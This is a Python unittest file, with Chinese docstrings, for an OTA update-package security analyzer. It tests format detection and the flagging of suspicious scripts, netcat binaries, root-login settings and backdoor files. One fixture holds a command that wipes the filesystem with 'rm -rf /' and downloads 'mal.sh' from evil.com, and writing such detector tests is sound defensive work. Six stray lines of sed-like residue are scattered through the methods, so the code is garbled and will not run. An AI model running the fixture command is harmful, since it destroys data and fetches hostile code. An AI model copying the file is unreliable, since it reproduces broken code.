
import os
import sys
_MOD_DEBUG = False
import unittest
import tempfile
import zipfile
import gzip
import importlib.util

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

module_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'modules', 'ota_diff_analyzer.py')
spec = importlib.util.spec_from_file_location('ota_diff_analyzer', module_path)
ota_diff_analyzer = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ota_diff_analyzer)

OTADiffAnalyzer = ota_diff_analyzer.OTADiffAnalyzer
OTADiffResult = ota_diff_analyzer.OTADiffResult
OTAFormat = ota_diff_analyzer.OTAFormat
ChangeType = ota_diff_analyzer.ChangeType
RiskLevel = ota_diff_analyzer.RiskLevel


class TestOTADiffAnalyzer(unittest.TestCase):

    def setUp(self):
        """设置测试环境"""
        # 创建临时测试文件
        self.temp_file = tempfile.NamedTemporaryFile(mode='wb', delete=False)
        self.temp_file.write(b'OTA test content')
        self.temp_file.close()

    def tearDown(self):
        """清理测试环境"""
        if os.path.exists(self.temp_file.name):
            os.unlink(self.temp_file.name)

    def test_invalid_path(self):
        """测试无效路径"""
        analyzer = OTADiffAnalyzer('/nonexistent/path/to/ota.zip')
        result = analyzer.analyze()
        self.assertFalse(result.analysis_success)
        self.assertIn('无效的OTA包路径', result.error_message)

    def test_zip_format_detection(self):
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.zip', delete=False) as f:
            zip_path = f.name

        try:
            # 创建一个空的ZIP文件
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('test.txt', 'test content')

            analyzer = OTADiffAnalyzer(zip_path)
            result = analyzer.analyze()

            self.assertTrue(result.analysis_success)
            self.assertEqual(result.ota_format, OTAFormat.ZIP)
lass字段完整性$/d
            self.assertGreaterEqual(len(result.extracted_files), 1)
        finally:
            if os.path.exists(zip_path):
                os.unlink(zip_path)

    def test_gzip_format_detection(self):
        """测试GZIP格式检测"""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.gz', delete=False) as f:
            gz_path = f.name

        try:
            # 创建GZIP文件
            with gzip.open(gz_path, 'wb') as gf:
                gf.write(b'test content')

            analyzer = OTADiffAnalyzer(gz_path)
            result = analyzer.analyze()

            self.assertTrue(result.analysis_success)
lass字段完整性$/d
            self.assertEqual(result.ota_format, OTAFormat.GZIP)
        finally:
            if os.path.exists(gz_path):
                os.unlink(gz_path)

    def test_bin_format_detection(self):
        """测试BIN格式检测"""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.bin', delete=False) as f:
            f.write(b'\x7fELF\x02\x01\x01\x00')
            bin_path = f.name

        try:
            analyzer = OTADiffAnalyzer(bin_path)
            result = analyzer.analyze()

lass字段完整性$/d
            self.assertTrue(result.analysis_success)
            self.assertEqual(result.ota_format, OTAFormat.BIN)
        finally:
            if os.path.exists(bin_path):
                os.unlink(bin_path)

    def test_suspicious_script_detection(self):
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.zip', delete=False) as f:
            zip_path = f.name

        try:
            # 创建包含可疑脚本的ZIP文件
            with zipfile.ZipFile(zip_path, 'w') as zf:
                script_content = 'system("rm -rf /"); curl -o /tmp/mal.sh http://evil.com/mal.sh'
                zf.writestr('update.sh', script_content)

            analyzer = OTADiffAnalyzer(zip_path)
            result = analyzer.analyze()

            self.assertTrue(result.analysis_success)

            # 检查是否检测到可疑脚本
            script_issues = [i for i in result.issues if i.type == 'suspicious_script']
            self.assertGreaterEqual(len(script_issues), 1)
        finally:
            if os.path.exists(zip_path):
                os.unlink(zip_path)

    def test_dangerous_binary_detection(self):
        """测试危险二进制文件检测"""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.zip', delete=False) as f:
            zip_path = f.name

        try:
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('bin/netcat', b'binary content')

            analyzer = OTADiffAnalyzer(zip_path)
            result = analyzer.analyze()

lass字段完整性$/d
            self.assertTrue(result.analysis_success)

            binary_issues = [i for i in result.issues if i.type == 'dangerous_binary']
            self.assertGreaterEqual(len(binary_issues), 1)
        finally:
            if os.path.exists(zip_path):
                os.unlink(zip_path)

    def test_config_change_detection(self):
        """测试配置文件变更检测"""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.zip', delete=False) as f:
            zip_path = f.name

        try:
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('etc/passwd', 'root:x:0:0:root:/root:/bin/bash')
                zf.writestr('etc/sshd_config', 'PermitRootLogin yes')

            analyzer = OTADiffAnalyzer(zip_path)
            result = analyzer.analyze()

            self.assertTrue(result.analysis_success)

            config_issues = [i for i in result.issues if i.type == 'config_change']
            self.assertGreaterEqual(len(config_issues), 1)
        finally:
            if os.path.exists(zip_path):
                os.unlink(zip_path)

    def test_backdoor_signature_detection(self):
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.zip', delete=False) as f:
            zip_path = f.name

        try:
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('backdoor.sh', 'echo "backdoor activated"')

            analyzer = OTADiffAnalyzer(zip_path)
            result = analyzer.analyze()

lass字段完整性$/d
            self.assertTrue(result.analysis_success)

            backdoor_issues = [i for i in result.issues if i.type == 'backdoor_suspicion']
            self.assertGreaterEqual(len(backdoor_issues), 1)
        finally:
            if os.path.exists(zip_path):
                os.unlink(zip_path)

    def test_report_generation(self):
        """测试报告生成"""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.zip', delete=False) as f:
            zip_path = f.name

        try:
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('test.txt', 'test content')

            analyzer = OTADiffAnalyzer(zip_path)
            report_content = analyzer.generate_report()

            self.assertIsNotNone(report_content)
            self.assertIn('OTA差分更新分析报告', report_content)
        finally:
            if os.path.exists(zip_path):
                os.unlink(zip_path)

    def test_result_to_dict(self):
        """测试结果转换为字典"""
        with tempfile.NamedTemporaryFile(mode='wb', suffix='.zip', delete=False) as f:
            zip_path = f.name

        try:
            with zipfile.ZipFile(zip_path, 'w') as zf:
                zf.writestr('test.txt', 'test content')

            analyzer = OTADiffAnalyzer(zip_path)
            result = analyzer.analyze()
            dict_result = result.to_dict()

            self.assertIn('ota_path', dict_result)
            self.assertIn('ota_format', dict_result)
            self.assertIn('changes', dict_result)
            self.assertIn('issues', dict_result)
            self.assertIn('extracted_files', dict_result)
            self.assertIn('analysis_success', dict_result)
        finally:
            if os.path.exists(zip_path):
                os.unlink(zip_path)



if __name__ == '__main__':
    unittest.main()


